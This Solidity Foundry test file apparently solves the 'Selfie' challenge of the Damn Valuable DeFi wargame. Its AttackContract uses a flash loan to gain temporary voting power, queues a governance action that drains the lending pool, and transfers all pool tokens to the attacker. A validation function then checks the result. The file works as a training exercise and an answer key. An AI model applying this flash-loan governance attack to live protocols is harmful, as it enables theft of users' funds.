// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";

import {DamnValuableTokenSnapshot} from "../../../Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../Contracts/selfie/SelfiePool.sol";
import {ERC20Snapshot} from "openzeppelin-contracts/token/ERC20/extensions/ERC20Snapshot.sol";

contract AttackContract {
    SimpleGovernance simpleGovernance;
    SelfiePool selfiePool;
    DamnValuableTokenSnapshot dvtSnapshot;
    uint256 actionId;

    constructor(
        SimpleGovernance _simpleGovernance,
        SelfiePool _selfiePool,
        DamnValuableTokenSnapshot _damnValuableTokenSnapshot
    ) public {
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
        dvtSnapshot = _damnValuableTokenSnapshot;
    }

    function receiveTokens(address addr, uint256 amount) public {
        // assert(msg.sender == address(selfiePool));
        dvtSnapshot.snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);
        selfiePool.token().transfer(address(selfiePool), amount);
        // dvtSnapshot.snapshot();

        console.log("received address =", addr);
    }

    function startAttack() public {
        uint256 balance = selfiePool.token().balanceOf(address(selfiePool));
        selfiePool.flashLoan(balance);
    }

    function endAttack() public payable {
        simpleGovernance.executeAction{value: msg.value}(actionId);
        uint256 balance = selfiePool.token().balanceOf(address(this));
        selfiePool.token().transfer(msg.sender, balance);
    }

    // fallback() external payable {}
}

contract Selfie is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        console.log("Deploying attack contract...");
        AttackContract attack_obj = new AttackContract(
            simpleGovernance,
            selfiePool,
            dvtSnapshot
        );
        vm.label(address(attack_obj), "Attacker Contract");

        console.log("Starting attack ...");
        attack_obj.startAttack();

        console.log("Waiting for 2 days...");
        vm.warp(block.timestamp + simpleGovernance.getActionDelay());

        console.log("Finishing attack ...");
        attack_obj.endAttack{value: 1}();
        vm.stopPrank();

        console.log("Starting validation...");
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
